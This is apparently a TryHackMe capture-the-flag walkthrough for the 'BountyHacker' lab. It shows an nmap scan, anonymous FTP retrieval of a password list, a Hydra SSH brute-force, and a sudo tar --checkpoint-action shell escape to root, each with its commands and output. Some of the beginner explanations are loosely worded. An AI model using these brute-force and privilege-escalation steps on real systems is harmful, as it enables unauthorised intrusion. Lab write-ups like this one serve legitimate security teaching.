# TryHackMe – BountyHacker Walkthrough

## Step 1: Scanning the host with Nmap

Command:
```bash
root@ip-10-201-66-160:~# nmap -sS -sV -vv -A 10.10.187.129

Output:
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-19 03:41 BST
...
Discovered open port 80/tcp on 10.10.187.129
Discovered open port 22/tcp on 10.10.187.129
Discovered open port 21/tcp on 10.10.187.129
...
Nmap scan report for ip-10-10-187-129.ec2.internal (10.10.187.129)
Host is up, received reset ttl 62 (0.069s latency).
PORT      STATE  SERVICE         REASON         VERSION
20/tcp    closed ftp-data        reset ttl 62
21/tcp    open   ftp             syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open   ssh             syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http            syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
```

Explanation:
- **nmap**: Network scanning tool. Finds open ports/services are open.
- **Open Ports**: Ports that accept incoming connections. 21 (FTP), 22 (SSH), 80 (HTTP) are open; others are closed or filtered.
- **FTP (File Transfer Protocol)**: Service for transferring files between computers.
- **SSH (Secure Shell)**: Service for securely logging into a remote system.
- **HTTP**: Service for web pages.
- **Nmap flags explained**:
  - `-sS` → TCP SYN (stealth) scan; faster and less likely to be logged.  
  - `-sV` → detect service version, so we know which FTP/SSH/HTTP version is running.  
  - `-vv` → very verbose; gives more details than default.  
  - `-A` → aggressive scan (OS detection, scripts, traceroute).  
- **Why not just `-A`?**  
  - `-A` does many things but may skip info. Combining `-sS -sV -vv -A` ensures **we see all ports, versions, and detailed output**.  

We scan first to find **what services are running** and which ports are open.

---

## Step 2: Connecting to FTP and downloading files

Commands:
```bash
root@ip-10-201-66-160:~# ftp 10.10.187.129
Connected to 10.10.187.129.
220 (vsFTPd 3.0.5)
Name (10.10.187.129:root): anonymous
230 Login successful.
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
ftp> get task.txt
ftp> get locks.txt
ftp> bye
```

Explanation:
- **FTP** is used to get files from the server.  
- **Anonymous login** allows access without a password.  
- `ls` lists files on the server.  
- `get` downloads files to our local machine.  
- **Why `get` first, then `cat`**: We first retrieve the files from the remote FTP server; only after downloading can we read them locally with `cat`.  

Files found:  
- `task.txt` → shows the task assignments.  
- `locks.txt` → contains potential passwords for brute-force.  

How we found who wrote the task list: by reading `task.txt` locally after `get`.

---

## Step 3: Brute-forcing SSH using Hydra

Command:
```bash
root@ip-10-201-66-160:~# hydra -l lin -P locks.txt 10.10.187.129 ssh -t 4

Output:
[22][ssh] host: 10.10.187.129   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Explanation:
- **Brute-force**: Trying many passwords automatically until one works.  
- **Hydra command breakdown**:  
  - `-l lin` → username is lin.  
  - `-P locks.txt` → password list file.  
  - `10.10.187.129` → target IP.  
  - `ssh` → service to attack (SSH, not HTTP/FTP).  
  - `-t 4` → 4 parallel attempts at once (faster).  
- **Why SSH**: Only SSH accepts login with passwords; HTTP doesn’t use direct passwords this way, FTP allows anonymous login already.  
- **Memorization tip**:  
  - `-l` → login, `-P` → password list, `-t` → threads.  
  - Service is always last (ssh/http/ftp).  

---

## Step 4: Logging in via SSH

Commands:
```bash
root@ip-10-201-66-160:~# ssh lin@10.10.187.129
lin@10.10.187.129's password: RedDr4gonSynd1cat3
lin@ip-10-10-187-129:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

Explanation:
- SSH securely logs us into the remote system.  
- `cat user.txt` shows the **user flag**.  

---

## Step 5: Checking sudo privileges

Command:
```bash
lin@10-10-187-129:~/Desktop$ sudo -l
[sudo] password for lin: RedDr4gonSynd1cat3
User lin may run the following commands on ip-10-10-187-129:
    (root) /bin/tar
```

Explanation:
- `sudo` - "superuser do", allows a regular user to run commands with root (administrator) privileges.
- `sudo -l` lists commands lin can run as root.  
- lin can run `/bin/tar` with root privileges.  

---

## Step 6: Privilege escalation using tar

Command:
```bash
lin@10-10-187-129:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

Explanation:
- Explanation:
- `tar` normally archives files, but here we abuse it to run a shell.  
- `sudo` = run as root.  
- `/dev/null` = harmless placeholder.  
- We got this from `sudo -l` and GTFOBins: https://gtfobins.github.io/gtfobins/tar/#sudo  
- `cat /root/root.txt` shows the root flag

---

## Summary / Key Points

1. **Scan first** → see open ports (FTP, SSH, HTTP).  
2. **FTP** → anonymous login, get task and password files.  
3. **Brute-force** → SSH with Hydra using the password list from FTP.  
4. **SSH login** → access the user account and read user flag.  
5. **Sudo check** → see which commands can be run as root.  
6. **Privilege escalation** → use tar exploit to become root and get root flag.  

Tips for future use:  
- Always map `-l`, `-P`, `-t`, and service in Hydra.  
- Understand open ports and services to choose the attack vector.  
- FTP is for file transfer; HTTP is usually web pages; SSH is login access.  
- Download first (`get`) before reading locally (`cat`).  
- Using `-sS -sV -vv -A` ensures **maximum detail and reliability** compared to just `-A`.

---
Thanks y'all!
